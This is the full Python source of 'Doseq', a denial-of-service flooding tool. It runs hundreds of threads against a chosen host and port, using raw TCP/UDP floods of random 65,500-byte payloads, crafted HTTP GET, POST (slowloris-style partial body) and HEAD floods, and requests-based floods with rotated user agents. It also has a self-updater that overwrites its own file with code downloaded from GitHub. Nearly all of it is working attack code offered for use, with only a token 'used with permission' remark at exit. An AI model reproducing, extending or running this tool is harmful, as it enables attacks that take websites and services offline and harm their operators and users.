#!/usr/bin/python3
# ==============INFO==============#
# SCRIPT: Doseq
#    JOB: Distributed Denial Of Service Attack(DDoS)!
# CodedBy: Oseid Aldary
# ================================#

import sys, socket, os, time, random, threading, requests, signal, optparse, re, ctypes
from urllib.parse import urlparse
from core.uragents import *
import http.client as http
libgcc_s = ctypes.CDLL('libgcc_s.so.1')
# COLORS ####################
wi = "\033[1;37m"  # >>White#
rd = "\033[1;31m"  # >Red   #
gr = "\033[1;32m"  # >Green #
yl = "\033[1;33m"  # >Yellow#
#############################
version_path = os.path.join('core', 'version.txt')
attacks = ["get", "post", "head", "tcp", "udp"]
os.system("cls || clear")


def sock_flood():
    global fin_threads
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) if attack == 'tcp' else socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(5)
            s.connect((target, port))
            for _ in range(500):
                s.send(random._urandom(65500))
                if isKilled():
                    break
                time.sleep(delay)
            s.close()
        except (socket.error, BrokenPipeError, Exception) as err:
            if not isKilled():
                print("[" + yl + "!" + wi + "] " + yl + f"{attack.upper()}-ATTACK:" + wi + " Unable To Connect to Target [" + rd + target + wi + "]" + yl + " Maybe " + rd + "Down\n" + wi, end='\r')
            else:
                break
            if hasattr(err, 'errno'):
                if err.errno == 24:
                    break
                continue
        if isKilled():
            break
    fin_threads += 1


def get_attack():
    global fin_threads
    while True:
        try:
            get_packet = f"GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {random.choice(headers_useragents)}\r\nReferer: {random.choice(headers_referers)}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-us,en;q=0.5\r\nAccept-Encoding: gzip,deflate\r\nAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\nKeep-Alive: 115\r\nConnection: keep-alive\r\n\r\n".encode('ascii')
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((target, port))
            s.sendto(get_packet, (target, port))
            s.shutdown(1)
            if isKilled():
                break
            time.sleep(delay)
        except (socket.error, BrokenPipeError, Exception, BaseException) as err:
            if not isKilled():
                print("[" + yl + "!" + wi + "] " + yl + "GET-ATTACK:" + wi + " Unable To Connect to Target [" + rd + target + wi + "]" + yl + " Maybe " + rd + "Down\n" + wi, end='\r')
            else:
                break
            if hasattr(err, 'errno'):
                if err.errno == 24:
                    break
            continue
        if isKilled():
            break
    fin_threads += 1


def post_attack():
    global fin_threads
    while True:
        try:
            post_packet = f'POST / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {random.choice(headers_useragents)}\r\nConnection: keep-alive\r\nKeep-Alive: 900\r\nContent-Length: 10000\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n'.encode("ascii")
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((target, port))
            s.send(post_packet)
            s.send(random.choice("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890").encode('ascii'))
            s.close()
            if isKilled():
                break
            time.sleep(delay)
        except (socket.error, BrokenPipeError, Exception, BaseException) as err:
            if not isKilled():
                print("[" + yl + "!" + wi + "] " + yl + "POST-ATTACK:" + wi + " Unable To Connect to Target [" + rd + target + wi + "]" + yl + " Maybe " + rd + "Down\n" + wi, end='\r')
            else:
                break
            if hasattr(err, 'errno'):
                if err.errno == 24:
                    break
            continue
        if isKilled():
            break
    fin_threads += 1


def head_attack():
    global fin_threads
    while True:
        try:
            head_packet = f"HEAD / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {random.choice(headers_useragents)}\r\nAccept: text/html\r\n\r\n".encode("ascii")
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((target, port))
            s.send(head_packet)
            s.close()
            if isKilled():
                break
            time.sleep(delay)
        except (socket.error, BrokenPipeError, Exception, BaseException) as err:
            if not isKilled():
                print("[" + yl + "!" + wi + "] " + yl + "HEAD-ATTACK:" + wi + " Unable To Connect to Target [" + rd + target + wi + "]" + yl + " Maybe " + rd + "Down\n" + wi, end='\r')
            else:
                break
            if hasattr(err, 'errno'):
                if err.errno == 24:
                    break
            continue
        if isKilled():
            break
    fin_threads += 1


def request_get_attack():
    global fin_threads
    while True:
        try:
            req = requests.get(url, headers={'User-Agent': random.choice(headers_useragents), 'Content-Type': "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Referer": random.choice(headers_referers)}, timeout=5)
            if isKilled():
                break
            time.sleep(delay)
        except (Exception, BaseException) as err:
            if not isKilled():
                print("[" + yl + "!" + wi + "] " + yl + "REQUEST-GET-ATTACK:" + wi + " Unable To Connect to Target [" + rd + target + wi + "]" + yl + " Maybe " + rd + "Down\n" + wi, end='\r')
            else:
                break
            if hasattr(err, 'errno'):
                if err.errno == 24:
                    break
            continue
        if isKilled():
            break
    fin_threads += 1


def request_post_attack():
    global fin_threads
    while True:
        try:
            req = requests.post(url, headers={'User-Agent': random.choice(headers_useragents), "Content-Type": "application/x-www-form-urlencoded", "Accept": "text/plain", "Referer": random.choice(headers_referers)}, data={'test': 'test'}, timeout=5)
            if isKilled():
                break
            time.sleep(delay)
        except (Exception, BaseException) as err:
            if not isKilled():
                print("[" + yl + "!" + wi + "] " + yl + "REQUEST-POST-ATTACK:" + wi + " Unable To Connect to Target [" + rd + target + wi + "]" + yl + " Maybe " + rd + "Down\n" + wi, end='\r')
            else:
                break
            if hasattr(err, 'errno'):
                if err.errno == 24:
                    break
            continue
        if isKilled():
            break
    fin_threads += 1


def request_head_attack():
    global fin_threads
    while True:
        try:
            req = requests.head(url, headers={'User-Agent': random.choice(headers_useragents), "Accept": 'text/html'}, timeout=5)
            if isKilled():
                break
            time.sleep(delay)
        except (Exception, BaseException) as err:
            if not isKilled():
                print("[" + yl + "!" + wi + "] " + yl + "REQUEST-HEAD-ATTACK:" + wi + " Unable To Connect to Target [" + rd + target + wi + "]" + yl + " Maybe " + rd + "Down\n" + wi, end='\r')
            else:
                break
            if hasattr(err, 'errno'):
                if err.errno == 24:
                    break
            continue
        if isKilled():
            break
    fin_threads += 1


def cnet(server='www.google.com', port=80) -> bool:
    try:
        c = socket.create_connection((socket.gethostbyname(server), port), 2)
        c.close()
        return True
    except socket.error:
        pass
    return False


def quit(sig, fream):
    print(rd + "\n[" + yl + "!" + rd + "]" + yl + " User requested shutdown. " + rd + "..." + wi)
    time.sleep(1)
    if started:
        print(rd + "  [" + yl + "~" + rd + "]" + yl + " Aborting " + wi + f"{threads}" + yl + " Threads" + rd + "..." + wi)
        kill()
        while True:
            if len(THREADS) == fin_threads:
                break
    print(wi + "[" + gr + "*" + wi + "] Thanks For Using Doseq Script :)")
    if started:
        print("[" + gr + "*" + wi + "] I Hope You Used It With Permission" + yl + "!?" + wi)
    sys.exit(0)


def update_doseq():
    if not cnet("raw.githubusercontent.com", 80):
        print(rd + "\n[ " + yl + "!" + rd + "]" + yl + f" Unable To Check For Updates {'Please Check Your Internet Connection' if not cnet() else ''} " + rd + "!!!" + wi)
        sys.exit(1)
    with open(version_path, 'r') as version:
        current_version = version.read().strip()
    print(wi + "[" + gr + "I" + wi + "] Current Version: [" + yl + current_version + wi + "]")
    print(wi + "  [" + yl + "~" + wi + "]" + yl + " Check For Updates" + wi + "...")
    con = http.HTTPSConnection("raw.githubusercontent.com")
    con.request('GET', "/Oseid/Doseq/main/core/version.txt")
    resp = con.getresponse()
    if resp.status != 200:
        print(rd + "\n[" + yl + "!" + rd + "]" + yl + " Unable To Update Error Code: " + str(resp.statuse) + rd + " !!!" + wi)
        sys.exit(1)
    repo_version = resp.read().strip().decode()
    if repo_version == current_version:
        print(wi + "    [" + gr + "*" + wi + "] This Script Is Up To Date :)")
        sys.exit(0)
    print(wi + "    [" + gr + "+" + wi + "] An update has been found :::" + gr + " Updating To Version:" + wi + " [" + yl + repo_version + wi + "]...")
    con.request('GET', "/Oseid/Doseq/main/doseq.py")
    new_code = con.getresponse().read().strip().decode()
    with open(__file__, 'w') as doseq_script:
        doseq_script.write(new_code)
    with open(version_path, 'w') as current_version:
        current_version.write(repo_version)
    print(wi + "      [" + gr + "*" + wi + "]" + gr + " Updated" + wi + " Successfully :)")


banner = """\033[1;31m
                   .-"      "-.
                  /            \\
                 | \033[1;33m ${JOKER11}\033[1;31m  |
                 |,  .-.  .-.  ,|
                 | )(__/  \__)( |
                 |/     /\     \|
       (@_       (_     ^^     _)
  _     ) \_______\__|IIIIII|__/__________________________
 (_)@8@8{}<________|-\IIIIII/-|_\033[1;32mA\033[1;31m_\033[1;32mN\033[1;31m_\033[1;32mO\033[1;31m_\033[1;32mN\033[1;31m_\033[1;32mY\033[1;31m_\033[1;32mM\033[1;31m_\033[1;32mO\033[1;31m_\033[1;32mU\033[1;31m_\033[1;32mS\033[1;31m_\033[1;32mA\033[1;31m_\033[1;32mR\033[1;31m_\033[1;32mA\033[1;31m_\033[1;32mB\033[1;31m_>
        )_/        \          /
       (@           `--------` \033[1;37mDD0$Eq\033[1;31m!\033[1;37m

            [---]   by:>\033[1;32m Oseid Aldary\033[1;37m   [---]\033[1;32m
            =-------=-=-=-=-=-=-=-=-=-------=
"""
started = False
signal.signal(signal.SIGINT, quit)
signal.signal(signal.SIGTERM, quit)
print(banner)
parse = optparse.OptionParser(usage='''
Usage: python3 ./doseq.py [OPTIONS...]
-------------
OPTIONS:
       |
    |--------
    | -s/--server   <target_(IP,domain,url)>                  ::> Specify target ip,domain or Url (Required)
    |--------
    | -p/--port     <target_port>                             ::> Specify target port number Default(80) (Optional)
    |--------
    | -t/--threads  <threads_number>                          ::> Specify number of threads Default(200) (Optional)
    |--------
    | -a/--attack   <attack_type_(GET,POST,HEAD,TCP,UDP)>     ::> Specify attack type to be used Default(random) (Optional)
    |--------
    | -d/--delay    <delay time in seconds>                   ::> Specify delay time inside threads Default(0.1s) (Optional)
    |--------
    | -S/--sleep    <sleep time in seconds>                   ::> Specify sleep time between started threads Default(0s) (Optional)
    |--------
    | -u/--update                                             ::> Check for updates
-------------
Examples:
        |
     |--------
     | python3 doseq.py -s 192.168.1.1
     |--------
     | python3 doseq.py -s mydomain.com -p 443
     |--------
     | python3 doseq.py -s 192.168.0.22 -p 22 -t 500 -a tcp -d 0.30 -S 0.60
     |--------
     | python3 doseq.py --update

''', add_help_option=False, version='Doseq version 1.0')
parse.add_option('-s', '--server', '--target', type=str, dest='target')
parse.add_option('-p', '--port', type=str, dest='port')
parse.add_option('-t', '--threads', type=str, dest='threads')
parse.add_option('-a', '--attack', type=str, dest='attack')
parse.add_option('-d', '--delay', type=str, dest='delay')
parse.add_option('-S', '--sleep', type=str, dest='sleep')
parse.add_option('-u', '--update', action='store_true', dest='update', default=False)
(options, args) = parse.parse_args()
target = options.target
port = options.port
threads = options.threads
attack = options.attack
delay = options.delay
sleep = options.sleep
update = options.update
opts = [target, port, threads, attack, delay, sleep, update]
if target:
    if not port:
        port = 80
    else:
        if not port.isdigit() or not 0 <= int(port) <= 65535:
            print(rd + "[" + yl + "!" + rd + "]" + yl + " Error: Invalid Port Number Selected" + rd + " !!!")
            sys.exit(1)
        port = int(port)
    if not threads:
        threads = 200
    else:
        if not threads.isdigit() or int(threads) <= 0:
            print(rd + "[" + yl + "!" + rd + "]" + yl + " Error: Invalid Threads Number Selected" + rd + " !!!" + wi)
            sys.exit(1)
        threads = int(threads)
    if not attack:
        attack = random.choice(attacks)
    else:
        attack = attack.lower()
        if attack not in attacks:
            print(rd + "[" + yl + "!" + rd + "]" + yl + " Error: Invalid Attack Type Selected" + rd + " !!!" + wi)
            sys.exit(1)
    if not delay:
        delay = .1
    else:
        if not re.match(r'\d+(\.\d*)?|\.\d+', delay) or delay in ('0', '0.0'):
            print(rd + "[" + yl + "!" + rd + "]" + yl + " Error: Invalid Delay Number Selected" + rd + " !!!" + wi)
            sys.exit(1)
        delay = float(delay) if '.' in delay else int(delay)
    if sleep:
        if not re.match(r'\d+(\.\d*)?|\.\d+', sleep) or sleep in ('0', '0.0'):
            print(rd + "[" + yl + "!" + rd + "]" + yl + " Error: Invalid Sleep Number Selected" + rd + " !!!" + wi)
            sys.exit(1)
        sleep = float(sleep) if '.' in sleep else int(sleep)
elif update:
    update_doseq()
    sys.exit(0)
else:
    if any(opt for opt in opts):
        print(rd + "[" + yl + "!" + rd + "]" + yl + " Error: Please specify the target because it is required" + rd + " !!!" + wi)
        sys.exit(1)
    print(parse.usage)
    sys.exit(0)
if target.startswith(("https://", "http://")):
    if target.count("/") == 2:
        target = target + "/"
    url = target
else:
    url = "http://" + target + "/"
target = urlparse(url).netloc
print(wi + "[" + yl + "~" + wi + f"] Check The Connection To The Target " + gr + f"{target}" + wi + ":" + rd + f"{port}" + wi + " [...]", end='\r')
time.sleep(2)
if not cnet(target, port):
    print("[" + rd + "-" + wi + "] Check The Connection To The Target " + gr + f"{target}" + wi + ":" + rd + f"{port}" + wi + " [" + rd + "Fail" + wi + "]\n", end='\r')
    print(rd + "  [" + yl + "!" + rd + "]" + yl + " Error: Unable to Connect to Target On " + rd + f"{target}" + yl + ":" + rd + f"{port}" + wi + "  ::: " + yl + f" {'Please Check Your Internet Connection' if not cnet() else 'Please Check Your Target and port'} " + rd + "!!!\n" + wi)
    sys.exit(1)
print("[" + gr + "+" + wi + "]" + wi + f" Check The Connection To The Target " + gr + f"{target}" + wi + ":" + rd + f"{port}" + wi + " [" + gr + "Connected" + wi + "]\n", end='\r')
print(wi + "[" + yl + "~" + wi + "] Starting " + gr + f"{threads}" + wi + " Threads [...]", end='\r')
fin_threads = 0
THREADS = list()
event = threading.Event()
kill = lambda: event.set()
isKilled = lambda: event.isSet()
lock = threading.Lock()
time.sleep(1.5)
print("[" + gr + "+" + wi + "] Starting " + gr + f"{threads}" + wi + " Threads [" + gr + "DONE" + wi + "]\n", end='\r')
time.sleep(1.5)
os.system("cls || clear")
print("\n" + banner)
print(wi + "[" + gr + "*" + wi + "]" + yl + "-=-=-=-=-=-=-= " + gr + "Attack Has Been Start On (" + yl + f"{target}:{port}" + gr + ")" + yl + " -=-=-=-=-=-=-=" + wi + "[" + gr + "*" + wi + "]")
print("[" + yl + "I" + wi + "] Infinity [ " + yl + attack.upper() + wi + " ] requests started On Target...")
print("[" + yl + "I" + wi + "] Press " + gr + "' Ctrl+C ' " + wi + "To Stop The Attack")
workers = round(threads / 2) if attack not in ('tcp', 'udp') else threads
started = True
for _ in range(workers):
    if attack == 'get':
        t1 = threading.Thread(target=get_attack)
        t1.daemon = True
        t1.start()
        THREADS.append(t1)
        t2 = threading.Thread(target=request_get_attack)
        t2.daemon = True
        t2.start()
        THREADS.append(t2)
    elif attack == 'post':
        t3 = threading.Thread(target=post_attack)
        t3.daemon = True
        t3.start()
        THREADS.append(t3)
        t4 = threading.Thread(target=request_post_attack)
        t4.daemon = True
        t4.start()
        THREADS.append(t4)
    elif attack == 'head':
        t5 = threading.Thread(target=head_attack)
        t5.daemon = True
        t5.start()
        THREADS.append(t5)
        t6 = threading.Thread(target=request_head_attack)
        t6.daemon = True
        t6.start()
        THREADS.append(t6)
    else:
        t7 = threading.Thread(target=sock_flood)
        t7.daemon = True
        t7.start()
        THREADS.append(t7)
    if isKilled():
        break
    if sleep:
        time.sleep(sleep)
for t in THREADS:
    t.join()
##############################################################
#####################                #########################
#####################   END OF TOOL  #########################
#####################                #########################
##############################################################
# This Tool Coded By Oseid Aldary
# Have a nice day :)
# GoodBye
